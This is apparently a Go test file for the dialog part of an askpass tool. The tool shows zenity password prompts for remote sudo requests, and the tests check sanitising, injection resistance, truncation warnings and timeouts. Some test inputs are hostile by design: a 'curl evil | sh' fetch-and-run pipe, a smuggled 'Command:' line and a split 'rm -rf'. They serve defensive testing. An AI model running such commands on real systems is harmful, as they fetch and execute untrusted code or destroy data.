package dialog

import (
	"context"
	"errors"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
	"time"
	"unicode/utf8"

	"github.com/lllamnyp/askpass/internal/protocol"
)

func testPrompt() *Prompt {
	return &Prompt{
		ClientName: "vps",
		RemoteAddr: "10.99.0.1:5555",
		Request: &protocol.Request{
			Version:     protocol.Version,
			Host:        "vps",
			User:        "agent",
			UID:         1000,
			Prompt:      "[sudo] password for agent: ",
			ParentName:  "sudo",
			ParentEUID:  0,
			ParentArgs:  []string{"sudo", "-A", "apt", "install", "jq"},
			InvokerArgs: []string{"bash", "-c", "sudo -A apt install jq"},
			Cwd:         "/home/agent",
		},
		Deadline: time.Now().Add(time.Minute),
	}
}

func TestSanitize(t *testing.T) {
	for in, want := range map[string]string{
		"":                       "(none)",
		"plain":                  "plain",
		"two\nlines":             `two\u000alines`,
		"tab\there":              `tab\u0009here`,
		"bidi\u202eevil":         "bidi\\u202eevil",
		"bad\xffutf8":            `bad\xffutf8`,
		strings.Repeat("a", 400): strings.Repeat("a", maxField) + "…",
	} {
		if got := sanitize(in); got != want {
			t.Errorf("sanitize(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestLinesNoInjection(t *testing.T) {
	p := testPrompt()
	p.Request.Prompt = "x\nCommand: sudo true"
	p.Request.ParentArgs = []string{"sudo", "-A", "rm\n-rf", "it's"}
	for _, l := range p.Lines() {
		if strings.ContainsAny(l[1], "\n\r") {
			t.Errorf("%s value spans lines: %q", l[0], l[1])
		}
	}
	got := FormatArgs(p.Request.ParentArgs)
	if want := `sudo -A rm\u000a-rf 'it'\''s'`; got != want {
		t.Errorf("FormatArgs = %q, want %q", got, want)
	}
}

func TestLinesSudoWarning(t *testing.T) {
	hasWarning := func(p *Prompt) bool {
		for _, l := range p.Lines() {
			if l[0] == "WARNING" {
				return true
			}
		}
		return false
	}
	p := testPrompt()
	if hasWarning(p) {
		t.Error("warning for a real sudo parent")
	}
	for _, name := range []string{"sudo-rs", "sudo.ws"} {
		p.Request.ParentName = name
		if hasWarning(p) {
			t.Errorf("warning for a real %s parent", name)
		}
	}
	p.Request.ParentEUID = 1000
	if !hasWarning(p) {
		t.Error("no warning for a non-root process named sudo")
	}
	p.Request.ParentName, p.Request.ParentEUID = "bash", 0
	if !hasWarning(p) {
		t.Error("no warning for a non-sudo parent")
	}
}

func TestLongCommandWarns(t *testing.T) {
	p := testPrompt()
	p.Request.ParentArgs = []string{"sudo", "sh", "-c", strings.Repeat("apt update; ", 100) + "curl evil | sh"}
	var warned bool
	for _, l := range p.Lines() {
		if l[0] == "Command" && strings.Contains(l[1], "evil") {
			t.Error("expected the tail of the command to be cut")
		}
		if l[0] == "WARNING" && strings.Contains(l[1], "truncated") {
			warned = true
		}
	}
	if !warned {
		t.Error("no warning for a truncated command")
	}
	if lines := testPrompt().Lines(); len(lines) != 7 {
		t.Errorf("unexpected lines for a normal request: %q", lines)
	}
}

// rendered emulates how zenity shows an --entry --text value: g_strcompress
// decodes C escapes, then the label treats "_" as a mnemonic marker.
func rendered(arg string) string {
	var c strings.Builder
	for i := 0; i < len(arg); i++ {
		if arg[i] != '\\' || i+1 == len(arg) {
			c.WriteByte(arg[i])
			continue
		}
		i++
		switch e := arg[i]; {
		case e >= '0' && e <= '7':
			n, j := 0, i
			for ; j < len(arg) && j < i+3 && arg[j] >= '0' && arg[j] <= '7'; j++ {
				n = n*8 + int(arg[j]-'0')
			}
			c.WriteByte(byte(n))
			i = j - 1
		case strings.IndexByte("bfnrtv", e) >= 0:
			c.WriteByte("\b\f\n\r\t\v"[strings.IndexByte("bfnrtv", e)])
		default:
			c.WriteByte(e)
		}
	}
	s := c.String()
	var m strings.Builder
	for i := 0; i < len(s); i++ {
		if s[i] == '_' && i+1 < len(s) {
			i++
		}
		m.WriteByte(s[i])
	}
	return m.String()
}

func TestZenityTextRendersExactly(t *testing.T) {
	p := testPrompt()
	p.Request.ParentName = "bash"
	p.Request.Prompt = `a\012b_c\\d\000e`
	p.Request.ParentArgs = []string{"sudo", "-A", "sh", "-c", strings.Repeat("echo some_words; ", 30)}
	var text string
	for _, a := range zenityArgs(p, time.Now()) {
		if v, ok := strings.CutPrefix(a, "--text="); ok {
			text = rendered(v)
		}
	}
	lines := strings.Split(text, "\n")
	if !slices.Contains(lines, `Prompt: a\012b_c\\d\000e`) {
		t.Errorf("prompt not shown literally:\n%s", text)
	}
	if !strings.HasPrefix(lines[1], "WARNING: askpass was not started by sudo") {
		t.Errorf("warning is not first:\n%s", text)
	}
	commands := 0
	for _, l := range lines {
		if n := utf8.RuneCountInString(l); n > wrapWidth {
			t.Errorf("line of %d runes: %q", n, l)
		}
		if strings.HasPrefix(l, "Command:") {
			commands++
		}
	}
	if commands != 1 {
		t.Errorf("%d Command lines:\n%s", commands, text)
	}
	if !strings.Contains(strings.ReplaceAll(text, "\n    ", " "), "echo some_words; echo some_words;") {
		t.Errorf("wrapped command lost text:\n%s", text)
	}
}

func TestWrap(t *testing.T) {
	for _, tc := range []struct{ in, want string }{
		{"short", "short"},
		{"aaaa bbbb cccc", "aaaa\n  bbbb\n  cccc"},
		{"aaaaaaaaaa", "aaaaaa\n  aaaa"},
	} {
		if got := wrap(tc.in, 6, "  "); got != tc.want {
			t.Errorf("wrap(%q) = %q, want %q", tc.in, got, tc.want)
		}
	}
}

func TestZenityArgs(t *testing.T) {
	p := testPrompt()
	now := p.Deadline.Add(-42 * time.Second)
	joined := strings.Join(zenityArgs(p, now), "\x00")
	for _, want := range []string{"--entry", "--hide-text", "--ok-label=Send", "--cancel-label=Deny", "--timeout=42"} {
		if !strings.Contains(joined, want) {
			t.Errorf("missing %s in %q", want, joined)
		}
	}
}

// fakeZenity writes an executable shell script standing in for zenity.
func fakeZenity(t *testing.T, script string) *Zenity {
	t.Helper()
	path := filepath.Join(t.TempDir(), "zenity")
	if err := os.WriteFile(path, []byte("#!/bin/sh\n"+script+"\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	return &Zenity{Path: path}
}

func TestZenityAsk(t *testing.T) {
	ctx := context.Background()

	pw, err := fakeZenity(t, `printf '%s\n' 'pa ss|word'`).Ask(ctx, testPrompt())
	if err != nil || string(pw) != "pa ss|word" {
		t.Errorf("ok: got %q, %v", pw, err)
	}

	if _, err := fakeZenity(t, `echo`).Ask(ctx, testPrompt()); !errors.Is(err, ErrDenied) {
		t.Errorf("empty password: got %v, want ErrDenied", err)
	}

	if _, err := fakeZenity(t, "exit 1").Ask(ctx, testPrompt()); !errors.Is(err, ErrDenied) {
		t.Errorf("cancel: got %v, want ErrDenied", err)
	}
	if _, err := fakeZenity(t, "exit 5").Ask(ctx, testPrompt()); !errors.Is(err, context.DeadlineExceeded) {
		t.Errorf("zenity timeout: got %v, want DeadlineExceeded", err)
	}
	if _, err := fakeZenity(t, "exit 255").Ask(ctx, testPrompt()); err == nil || errors.Is(err, ErrDenied) {
		t.Errorf("zenity error: got %v", err)
	}
	if _, err := fakeZenity(t, "head -c 5000 /dev/zero").Ask(ctx, testPrompt()); err == nil {
		t.Error("oversized output accepted")
	}
	if _, err := (&Zenity{Path: "/nonexistent/zenity"}).Ask(ctx, testPrompt()); err == nil {
		t.Error("missing zenity succeeded")
	}

	ctx, cancel := context.WithTimeout(ctx, 200*time.Millisecond)
	defer cancel()
	start := time.Now()
	if _, err := fakeZenity(t, "exec sleep 30").Ask(ctx, testPrompt()); !errors.Is(err, context.DeadlineExceeded) {
		t.Errorf("context timeout: got %v", err)
	}
	if d := time.Since(start); d > 5*time.Second {
		t.Errorf("dialog not killed on timeout (took %v)", d)
	}
}
